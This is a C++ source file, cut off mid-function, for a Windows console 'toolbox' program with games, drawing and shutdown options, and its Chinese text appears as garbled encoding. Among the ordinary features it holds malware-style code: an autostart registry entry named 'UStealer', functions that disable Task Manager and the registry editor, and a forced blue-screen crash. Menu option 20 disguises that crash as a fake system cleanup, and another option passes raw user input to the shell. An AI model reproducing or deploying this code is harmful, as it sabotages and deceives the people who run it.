#include<stdio.h>
#include<stdlib.h>
#include<iostream>
#include<Windows.h>
#include <time.h>
#include <algorithm>
#include<direct.h>
#include <graphics.h>
#include <conio.h>
#include<string>
#include <stdint.h>				// uint64_t
#include<tchar.h>
#include <TlHelp32.h>
#include<vector>
#include <fstream>
#include <atlstr.h>
#include <chrono>
#include <thread>
#include "bolin.h"
#include"jindu.h"
#include"jiami.h"
#include"ziyuan.h"

TCHAR address_save_image[MAX_PATH];
static HWND hOut;
TCHAR address_load_image[MAX_PATH];		// ͼ���ַ
//TCHAR address_load_watermark[MAX_PATH];	// ˮӡ��ַ
IMAGE* img_temporary;			// ��ͼͼ�� 512*512
#define HEIGHT		1	// ȡƽ��ֵ����(����)
#define WIDTH		1	// ȡƽ��ֵ����(����)  1�Ļ�����һ������һ���ַ�,ֵԽ����ƬԽģ��,������Ҫһ��
#define CHAR_HEIGHT 13	// ������ַ���(����) �ַ����ؿ��Ϊ13
#define CHAR_WIDTH  13	// ������ַ���(����) �޸�С�Ļ����ַ�����ʾ������

char transcoding(int ascii)// ת�뺯��
{
	if (ascii > 200)
		return ' ';
	if (ascii < 33)
		return ascii + 33;
	if (ascii > 126)
		return ascii % 126 + 33;
	return ascii;
}
#undef UNICODE
#undef _UNICODE
using namespace std;
#define hm 871*2
#define wm 869*2
#define hm1 hm/5
#define wm1 wm/5
#define PI        acos(-1.0)
#define SPEED     (PI/360)								// �����ת�ٶ�
#define NEEDLE_L  180									// ��ĳ���	
#define h 1200
#define w 1920

BOOL FindProcess(string strProc)
{
	int i = 0;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		cout << "???��?????��????����?���?!" << endl;
		return false;
	}
	BOOL bMore = ::Process32First(hProcessSnap, &pe32);
	while (bMore)
	{
		//????????????stricmp????��?��?��???��??��????????��??????��???��??????
		if (0 == _stricmp(strProc.c_str(), pe32.szExeFile))
		{
			i += 1;  //????    
		}
		bMore = ::Process32Next(hProcessSnap, &pe32);
	}
	if (i >= 1)
	{
		return true;
	}
	else
	{
		return false;
	}
}
void HpSleep(int ms);									// ��ȷ��ʱ
void drawframe(int number);
void Move(int number, int x, int y);
void Rotate(double* R, int num);
bool Pin(double* R, int num);
void eraser(int x, int y);
class seat
{
public:
	int i = 0;      // y ����
	int j = 0;      // x ����
	int number = 0; // ����
};

// �������̵���
class box
{
public:
	void draw();            // ����
public:
	int x = 0;              // x ����
	int y = 0;              // y ����
	int value = -1;         // ֵ�����壺1�����壺0����λ��-1��
	int modle = 0;          // ģʽ
	bool isnew = false;     // �Ƿ���ѡ���
	COLORREF color = WHITE; // ���̱���ɫ
};


// ��������
void draw();                  // ����
void init();                  // ��ʼ��
seat findbestseat(int color, int c); // Ѱ�����λ��
void isWIN();                 // �ж���Ӯ
void game();     


struct Point
{
	int x;
	int y;

	Point() { x = -1; y = -1; }

	Point(int x, int y)
	{
		this->x = x;
		this->y = y;
	}

	bool operator==(const Point& p)
	{
		return x == p.x && y == p.y;
	}

	Point& operator=(const Point& p)
	{
		x = p.x; y = p.y;
		return *this;
	}
};

// ���пؼ��ĸ���
struct Tool
{
	int left;
	int top;
	int width;
	int height;

	Tool() {}

	Tool(int left, int top, int width, int height)
	{
		this->left = left;
		this->top = top;
		this->width = width;
		this->height = height;
	}

	virtual double call(MOUSEMSG) = 0;

	bool isIn(const Point& p)
	{
		if (p.x >= left && p.x <= left + width && p.y >= top && p.y <= top + height)
		{
			return true;
		}
		return false;
	}
};

// ��Ϊ������
struct Tool_Range :Tool
{
	Tool_Range() {}

	Tool_Range(int left, int top, int width, int height) :Tool(left, top, width, height) {}

	double call(MOUSEMSG m)
	{
		return 0;
	}
};


// �ɻ���������
struct Tablet :Tool
{
	int size;
	COLORREF color;

	Tablet() {}

	Tablet(int left, int top, int width, int height, int size, COLORREF color) :Tool(left, top, width, height)
	{
		this->size = size;
		this->color = color;
		isDown = false;
	}

	double call(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isDown = true;
				begPos = Point(m.x, m.y);
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			isDown = false;
		}

		if (m.uMsg == WM_MOUSEMOVE && isDown)
		{
			if (isIn(begPos) && isIn(Point(m.x, m.y)))		// ��������
			{
				setlinestyle(PS_ENDCAP_ROUND, size);
				setlinecolor(color);
				HRGN rgn = CreateRectRgn(left, top, left + width, top + height);
				setcliprgn(rgn);
				DeleteObject(rgn);
				line(begPos.x, begPos.y, m.x, m.y);
				setcliprgn(NULL);
			}
			begPos = Point(m.x, m.y);
		}

		return 1;
	}

private:
	bool isDown;
	Point begPos;
};

// �򵥱�ǩ
struct Label :Tool
{
	wstring s;
	COLORREF color;
	bool isCenteral;

	Label() {}

	Label(int left, int top, int width, int height, wstring s, COLORREF color, bool isCenteral = false) :Tool(left, top, width, height)
	{
		this->color = color;
		this->s = s;
	}

	double call(MOUSEMSG m)
	{
		setfillcolor(0xefefef);
		solidrectangle(left, top, left + width, top + height);
		settextcolor(color);
		setbkmode(TRANSPARENT);
		settextstyle(24, 15, "Courier");
		RECT rect = { left, top, left + width, top + height };
		return 1;
	}

	bool isClick(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONUP)
		{
			if (isIn(Point(m.x, m.y)))
			{
				return true;
			}
		}
		return false;
	}
};

// Բ�ΰ�ť
struct Circle :Tool
{
	COLORREF color;
	COLORREF color_over;
	bool isClick;

	Circle()
	{
		isClick = false;
	}

	Circle(int left, int top, int width, int height, COLORREF color, COLORREF color_over) :Tool(left, top, width, height)
	{
		this->color = color;
		this->color_over = color_over;
		isClick = false;
	}

	double call(MOUSEMSG m) { return 1; }

	bool call(MOUSEMSG m, Tablet& tab)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isClick = true;
				tab.color = color;
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isClick = true;
			}
		}

		if (m.uMsg == WM_MOUSEMOVE)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isOver = true;
			}
			else
			{
				isOver = false;
			}
		}

		setfillcolor(color);	// always have a color
		if (isOver) setfillcolor(color_over);
		setlinecolor(0xffffff);
		if (isClick)
		{
			setlinestyle(PS_ENDCAP_ROUND, 3);
		}
		else
		{
			setlinestyle(PS_ENDCAP_ROUND, 0);
		}
		fillellipse(left, top, left + width, top + height);
		return isClick;
	}

private:
	bool isOver;
};

//������
struct Slider :Tool
{
	double percent;
	int radius;
	COLORREF bkcolor;
	COLORREF fkcolor;

	Slider() { }

	Slider(int left, int top, int width, int height, double percent = 0, int radius = 0, COLORREF bkcolor = 0x000000, COLORREF fkcolor = 0xffffff) :Tool(left, top, width, height)
	{
		this->percent = percent;
		this->radius = radius;
		this->bkcolor = bkcolor;
		this->fkcolor = fkcolor;
		setRange();
	}

	double call(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (m.x >= left - radius && m.x <= left + width + radius && m.y >= top && m.y <= top + height)
			{
				isDrag = true;
				deltaY = range.top - m.y;
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			isDrag = false;
		}

		if (m.uMsg == WM_MOUSEMOVE && isDrag)
		{
			int t = deltaY + m.y;
			if (t < top)
			{
				percent = 0;
			}
			else if (t > top + height - radius)
			{
				percent = 1;
			}
			else
			{
				percent = (t - top) / (double)(height - radius);
			}
		}

		setRange();
		setfillcolor(0xefefef);
		solidrectangle(left - radius, top - (radius / 2 + 2), left + width + radius, top + height + (radius / 2 + 2));
		setfillcolor(bkcolor);
		solidroundrect(left, top, left + width, top + height, 3, 3);
		setfillcolor(fkcolor);
		solidellipse(range.left, range.top, range.left + radius, range.top + radius);
		return percent;
	}

private:
	bool isDrag = false;
	int deltaY = 0;
	Tool_Range range;

	void setRange()
	{
		double t = radius / 2.0;
		double y = height - radius;
		y *= percent;
		y = top + t + y;
		double x = left + width / 2.0;
		range.left = (int)(x - t);
		range.top = (int)(y - t);
		range.width = radius;
		range.height = radius;
	}
};








































char* aaa() {//��ȡ��ִ���ļ�·��

	char szBuf[512] = { 0 };
	getcwd(szBuf, sizeof(szBuf) - 1);
	printf("buf:%s\n", szBuf);


	char szPath[512] = { 0 };
	GetModuleFileName(NULL, szPath, sizeof(szPath) - 1);
	printf("path:%s\n", szPath);
	return szPath;
}
void HKRunator(char* programName)   //�������ƣ�**ȫ·��**��
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //����һ��ע�����������򿪸�ע�����
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //����windowsϵͳ������лᱨ�� ɾ�� ����KEY_WOW64_64KEY | ���� ����
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueEx(hkey,
			"UStealer",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}
//��궶��
void MOUSE() {
	int x = 0, y = 0, a = 0;
	int n = 4;
	POINT p;
	srand((unsigned)time(NULL));
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	GetCursorPos(&p);
	x = rand() % n;
	y = rand() % n;
	a = rand() % n;
	if (a == 1)
	{
		SetCursorPos(p.x + x, p.y + y);
		//SetCursorPos(p.x-x,p.y+y);//�����ȶ�
	}
	else if (a == 0)
	{
		SetCursorPos(p.x - x, p.y - y);
		//SetCursorPos(p.x+x,p.y-y);//�����ȶ�
	}
	Sleep(0);
}
//ͼ��
void ICON() {
	int n = 70, n1 = 1920, n2 = 1200, x1, y1;
	int i = 0;
	HWND hwnd = GetDesktopWindow();
	HINSTANCE hshell32 = LoadLibrary(_T("shell32.dll"));
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	srand((unsigned)time(NULL));
	POINT p;
	srand((unsigned)time(NULL));
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	for (int i = 0; i < 10; i++) {

		x1 = rand() % n1;
		y1 = rand() % n2;
		GetCursorPos(&point);
		i = rand() % 256;
		DrawIcon(hdc, x1, y1, LoadIcon(hshell32, MAKEINTRESOURCE(i)));
	}
}
//����
void lanping() {
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC ZwRaiseHardError = GetProcAddress(ntdll, "ZwRaiseHardError");
	unsigned char ErrorKill;
	long unsigned int HardError;
	((void(*)(DWORD, DWORD, bool, LPBYTE))RtlAdjustPrivilege)(0x13, true, false, &ErrorKill);
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardError)(0xc0114514, 0, 0, 0, 6, &HardError);
}
// ����ϵͳ���������
void RegTaskmanagerForbidden(bool a)
{
	HKEY hkey;
	DWORD value = a;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// ����ע���༭��
void RegEditForbidden(bool a)
{
	HKEY hkey;
	DWORD value = a;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// �ɵ������ֽ
void RegModifyBackroud(bool a)
{
	DWORD value = a;
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char*)"c://", 3);
	RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));

}

string open1;

void open(){
	int x, y;
	// ���ļ��Ի���
	OPENFILENAME ofn;
	// �����ļ�����·��
	TCHAR szFileName[MAX_PATH] = { 0 };
	// ���ù�������
	TCHAR szFilter[] = TEXT("ͼ�� (*.png,*.jpg,*.bmp)\0*.png;*.jpg\0") \
		TEXT("�����ļ� (*.*)\0*.*\0\0");
	ZeroMemory(&ofn, sizeof(ofn));
	// �����ļ�����·��
	ofn.lpstrFile = szFileName;
	ofn.nMaxFile = MAX_PATH;
	// �����ļ���
	ofn.lpstrFileTitle = address_load_image;
	ofn.nMaxFileTitle = MAX_PATH;
	ofn.lpstrFilter = szFilter;
	// Ĭ����չ��
	ofn.lpstrDefExt = _T("png");
	ofn.lpstrTitle = NULL;
	ofn.Flags = OFN_HIDEREADONLY | OFN_PATHMUSTEXIST;
	ofn.lStructSize = sizeof(OPENFILENAME);
	// ӵ�иöԻ���Ĵ��ھ��
	ofn.hwndOwner = hOut;
	GetOpenFileName(&ofn);
	// ���ã���ʼ��
//	img_temporary = new IMAGE(x, y);
	//img_watermark = new IMAGE(64, 64);
	// ����
//	loadimage(img_temporary, address_load_image, x, y);
	open1 = address_load_image;
}
HWND hwnd = GetForegroundWindow();
// ��Ϸ������
int main(int ab, char* b[])
{
	system("md resource");
	system("md Minecraft");
	system("md music");
	system("cls");
//	cout << ab;
	if(ab>1) {
		for (int i = 1; i <= ab; i++) {
			jiami(i, b, 0);
		}
		return 0;
	}
	cout << "������Դ��...";
	cout.flush();
	hideCursor(0);

	ziyuan("MP3", IDR_MP31, "w.MP3", "music\\", 1,0,60,100);

	std::cout << std::endl;
	cout << "���\n";
	cout.flush();
	system("cls");
	cout << "��ӭʹ�ü򵥹��������\n";
	cout << "���ߣ�������\n";
	cout << "�汾��2.0\n";
	cout << "���ܣ�\n";
	hideCursor(1);
	//system("cls");
	while (1) {
		int a;
		string s;
		system("title �򵥹��������");
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout  << "����(��Ҫ���ܵ��ļ��øó���򿪣��ٴ�һ�λ�ԭ)\n";
		cout << 2 << "������cmd����\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 3 << "��60���ػ�\n";
		cout << 4 << "��ȡ���ػ�\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_BLUE);
		cout << 5 << "������Windows\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_BLUE);
		cout << 6 << "���򿪻�ͼ\n";
		cout << 7 << "����cmd\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 8 << "���ػ�\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 9 << "��������\n";
		cout << 10 << "������\n";
		cout << 11 << "�������ļ���\n";
		cout << 12 << "���������\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 13 << "������explorer\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout << 14 << "����explorer\n";
		cout << 15 << "����PlainCraftLauncher2\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 16 << "������PlainCraftLauncher2\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 17 << "������\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 18 << "��60�������\n";
		cout << 19 << "������(��ȫ�ϵ磬���ǻᱣ�浱ǰ���Ե�״̬)\n";
		cout << 20 << "������\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_BLUE);
		cout << 21 << "����geek\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout << 22 << "��ɾ��D:\\del\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 23 << "��Ħ����\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout << 24 << "������Windows\n";
		cout << 25 << "������Devc++\n";
		cout << 26 << "��ͼƬת��Ϊ ASCII ͼ(�滻)\n";
		cout << 27 << "������bandizip\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout << 28 << "�������޸�\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 29 << "����������\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 30 << "���������д���\n";
		cout << 31 << "���ʶ��ı�\n";
		cout << 32 << "���������������\n";
		cout << 33 << "����������\n";
		cout << 34 << "��ȡ����������\n";
		cout << 35 << "������\n";
		cout << 36 << "���������\n";
		cout << 37 << "����Ļ���\n";
		cout << 38 << "��������ĻŤ���´�\n";
		cout << 39 << "��exe��dll ICON��ȡ\n";
		cout << 40 << "����Ч����\n";
		cout << 41 << "��������\n";
		cout << 42 <<"����������\n";


		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

		cin >> a;
		if ((a > 0 && a < 200)) {

		}
		else {
			cout << "�������ַ�";
			system("start �򵥹��������.exe");
			system("pause>null");

			exit(EXIT_SUCCESS);
			system("start �򵥹��������.exe");
		}

		if (a == 1) {
			string a = "echo curl https://sw.pcmgr.qq.com/36666aaecae92ec837809aa55a63af40/66486128/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o name.exe > ", b,c;
			cin >> b;
			c = a + b;
			//cout << c;
//			system("echo  curl https://sw.pcmgr.qq.com/36666aaecae92ec837809aa55a63af40/66486128/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o name.exe >D:\\�򵥹��������.bat ");//�ڹ�������˧>D:\�ҵ��ĵ�\Desktop\����\�½��ļ���\system.txt����system.txt��д���������˧ 

			system(c.c_str());//�򿪼򵥹��������.bat
			system("pause");
		}
		else if (a == 2) {
			cin >> s;
			system(s.c_str());
			//system("pause");
			system("start �򵥹��������.exe");
			exit(EXIT_SUCCESS);//�رմ���
			system("start �򵥹��������.exe");

		}
		else if (a == 3) {
			system("shutdown -s -t 60");
			system("start �򵥹��������.exe");
			for (int i = 1; i <= 60; i++) {
				system("cls");
				cout << i << "%60";
				Sleep(1000);

			}
		}
		else if (a == 4) {

			system("shutdown -a");

		}
		else if (a == 5) {
			string winver = "winver";
			system(winver.c_str());
		}
		else if (a == 6) {
			string mspaint = "mspaint";
			system(mspaint.c_str());
		}
		else if (a == 7) {
			string cmd = "cmd";
			system("cls");
			system("start �򵥹��������.exe");
			system(cmd.c_str());
		}
		else if (a == 8) {
			system("pause>null");
			system("shutdown -p");
		}
		else if (a == 9) {
			initgraph(700, 700); // ��ʼ����ͼ����
			setbkcolor(WHITE);
			cleardevice();
			setbkmode(TRANSPARENT); // ����͸�������������
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			
			while (1)
			{
				init(); // ��ʼ��
				game(); // ��Ϸ��ʼ
				cleardevice();
			}
		}
		else if (a == 10) {
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			const Point defaultWH(1100, 768);										// Ĭ�Ͽ��
			initgraph(defaultWH.x, defaultWH.y);									// ��ʼ��
			BeginBatchDraw();
			setfillcolor(0xffffff);
			fillrectangle(0, 0, defaultWH.x, defaultWH.y);							// Ĭ�ϻ�ͼ�屳��
			setfillcolor(0xefefef);
			fillrectangle(defaultWH.x - 100, 0, defaultWH.x, defaultWH.y);			// Ĭ�Ϲ���������

			// ����ؼ�������ʽ
			Tablet mainTablet(0, 0, defaultWH.x - 100, defaultWH.y, 5, 0x000000);
			Label label1(defaultWH.x - 100 + 27, 15, 48, 24, L"����", 0x666666);
			Label label2(defaultWH.x - 100 + 22, 740, 60, 20, L"1", 0x666666, true);
			Slider slider1(defaultWH.x - 100 + 48, 600, 5, 120, 0, 26, 0xc3c3c3, 0x666666);
			Circle Circles[9];
			for (int i = 0; i < 9; i++)
			{
				Circles[i].left = defaultWH.x - 100 + 26;
				Circles[i].top = 50 + i * 60;
				Circles[i].width = 50;
				Circles[i].height = 50;
			}
			Circles[0].color = 0x000000;	Circles[0].color_over = 0x2e2e2e;	Circles[0].isClick = true;
			Circles[1].color = 0xffffff;	Circles[1].color_over = 0xfafafa;
			Circles[2].color = 0x1f1ae6;	Circles[2].color_over = 0x332fe6;
			Circles[3].color = 0x7018ed;	Circles[3].color_over = 0x863eed;
			Circles[4].color = 0xed3eeb;	Circles[4].color_over = 0xed76ec;
			Circles[5].color = 0xad2f09;	Circles[5].color_over = 0xad5c43;
			Circles[6].color = 0xcfd12f;	Circles[6].color_over = 0xd0d15d;
			Circles[7].color = 0x11f41c;	Circles[7].color_over = 0x4ef456;
			Circles[8].color = 0x0c98d2;	Circles[8].color_over = 0x4dabd2;

			while (true)
			{
				while (MouseHit())
				{
					MOUSEMSG m = GetMouseMsg();

					//�ؼ�֮��Ľ�����ϵ
					mainTablet.call(m);
					double percent = slider1.call(m);
					int progress = (int)(1 + percent * percent * 299);
					mainTablet.size = progress;
					wchar_t protext[4];
					_itow_s(progress, protext, 10);
					label2.s = protext;
					int whichCircle = -1, whichCircleChoosed = -1;
					for (int i = 0; i < 9; i++)									// find last
					{
						if (Circles[i].isClick) whichCircleChoosed = i;
					}
					for (int i = 0; i < 9; i++)									// find last + new
					{
						if (Circles[i].call(m, mainTablet) && whichCircleChoosed != i)
							whichCircle = i;
					}
					if (whichCircle != -1)
					{
						Circles[whichCircle].isClick = true;
						Circles[whichCircleChoosed].isClick = false;
					}
					if (label1.isClick(m))
					{
						saveimage("��Ʒ.bmp");
					}

				}
				label1.call(MOUSEMSG());
				label2.call(MOUSEMSG());
				FlushBatchDraw();
				Sleep(50);
			}

			system("pause");
			EndBatchDraw();
			closegraph();

		}
		else if (a == 11) {
			string abcdd="for /L %i in (1,1,999) do MD %i && CD %i && echo %i";
			system(abcdd.c_str());
			system("pause");
			}
		else if (a == 12) {
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			initgraph(480, 640);
			while (true)
			{
				setbkcolor(RGB(189, 188, 187));
				cleardevice();
				drawframe(1);
				double radian[25] = { 0 };						// ������Ļ���
				int Needle_N = 0;								// ��ĸ���				
				MOUSEMSG msg;
				bool IS = false;
				while (true)
				{
					Move(Needle_N, 240, 560);					// �������λ��
					Move(Needle_N + 1, 240, 600);
					Move(Needle_N + 2, 240, 640);
					Rotate(radian, Needle_N);
					while (MouseHit())							// ���������Ϣ��ʱ��ִ��
					{
						msg = GetMouseMsg();					// ��ȡ�����Ϣ
						switch (msg.uMsg)						// ���ݲ�ͬ�������Ϣ��ִ�в�ͬ�Ĵ���
						{
						case WM_LBUTTONDOWN:
							if (Pin(radian, Needle_N))
							{
								Needle_N++;
							}
							else
							{
								IS = true;
							}break;
						}
					}
					if (IS)
					{
						break;
					}
					HpSleep(10);								// ��ʱ������ CPU ռ����
				}
				HWND wnd = GetHWnd();
				if (MessageBox(wnd, _T("��Ϸ������\n����һ����"), _T("ѯ��"), MB_YESNO | MB_ICONQUESTION) == IDYES)
					continue;
				else
					break;
			}
			return 0;
		}
		else if (a == 13) {
			string explorer = "TASKKILL /F /IM explorer.exe";
			system(explorer.c_str());
		}
		else if (a == 14) {
			string explorer2 = "start explorer.exe";
			system(explorer2.c_str());
		}
		else if (a == 15) {
			ziyuan("EXE", IDR_EXE5, "PlainCraftLauncher2.exe", "Minecraft\\", 0,0,100,10);
		}
		else if (a == 16) {
			string explorer = "TASKKILL /F /IM PlainCraftLauncher2.exe";
			system(explorer.c_str());
		}
		else if (a == 17) {
			int abcd;
			cout << "��Ҫ�ڼ�����ͼ��\n";
			cin >> abcd;
			cout << abcd << "����ͼ\n";
			ShowWindow(hwnd, SW_MINIMIZE);
			Sleep(abcd * 1000);

			// ��ȡ���� DC
			HDC srcDC = GetDC(NULL);
			// ����Ŀ�� IMAGE ����
			IMAGE img(w, h);
			// ��ȡ IMAGE ����� DC
			HDC dstDC = GetImageHDC(&img);
			// ������ DC ֮��ִ��ͼ�񿽱���������ץͼ������ IMAGE ��������
			BitBlt(dstDC, 0, 0, w, h, srcDC, 0, 0, SRCCOPY);

			// ������ͼ����
			initgraph(w, h);
			// �ڴ�������ʾ IMAGE �б��������ͼ��
			putimage(0, 0, &img);
			saveimage(_T("��ͼ.bmp"));
			// ��������˳�
			cout << "��ҳ������Ч!";
			system("title ��ҳ������Ч!");
			system("start �򵥹��������.exe");
			getmessage(EX_CHAR);

			closegraph();
		}
		else if (a==18) {
			system("shutdown  -r -t 60");
			system("start �򵥹��������.exe");
			for (int i = 1; i <= 60; i++) {
				system("cls");
				cout << i << "%60";
				Sleep(1000);
			}
		}else if (a == 19) {
			system("shutdown -h");
		}
		else if (a == 20) {
			ShowWindow(hwnd, SW_MINIMIZE);
			if (MessageBox(NULL, "��Щ����,��Ҫ�����?", "��ʾ", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
				if (MessageBox(NULL, "���ڽ������", "���", MB_OKCANCEL | MB_ICONASTERISK) == IDOK) {
					if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
						if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
							if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
								if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
									if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
										if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
											if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
												if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
													if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
														if (MessageBox(NULL, "���ʧ��", "���ʧ��", MB_OK | MB_ICONHAND) == IDOK) {
															if (MessageBox(NULL, "������", "�����", MB_OK | MB_ICONEXCLAMATION) == IDOK) {
																if (MessageBox(NULL, "������������������������", "����", MB_OK | MB_ICONQUESTION) == IDOK) {
																	if (MessageBox(NULL, "�޷����", "��������", MB_OK | MB_ICONHAND) == IDOK) {
																		ShowWindow(GetForegroundWindow(), SW_HIDE);
																		HMODULE ntdll = LoadLibrary("ntdll.dll");
																		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
																		FARPROC ZwRaiseHardError = GetProcAddress(ntdll, "ZwRaiseHardError");
																		unsigned char ErrorKill;
																		long unsigned int HardError;
																		((void(*)(DWORD, DWORD, bool, LPBYTE))RtlAdjustPrivilege)(0x13, true, false, &ErrorKill);
																		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardError)(0xc0114514, 0, 0, 0, 6, &HardError);
																		return 0;
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
					return 0;
				}
			}
		}
		else if (a == 21) {
			ziyuan("EXE", IDR_EXE1, "geek.exe", "resource\\", 1,0,10,10);
		}
		else if (a == 22) {
			system("del /Q /F /S D:\\del");
			}
		else if (a == 23) {
				cout << "��ҳ������Ч!";
				system("title ��ҳ������Ч!");
				system("start �򵥹��������.exe");
				initgraph(wm, hm);
				IMAGE bk;


				for (int i = 0; i < wm; i = i + wm1) {
					for (int j = 0; j < h; j = j + hm1) {
						loadimage(&bk, _T("PNG"), IDB_PNG1/*_T("Background")*/, wm1, hm1);

						putimage(/*x*/i, /*y*/j, &bk);
					}
				}

				while (true)
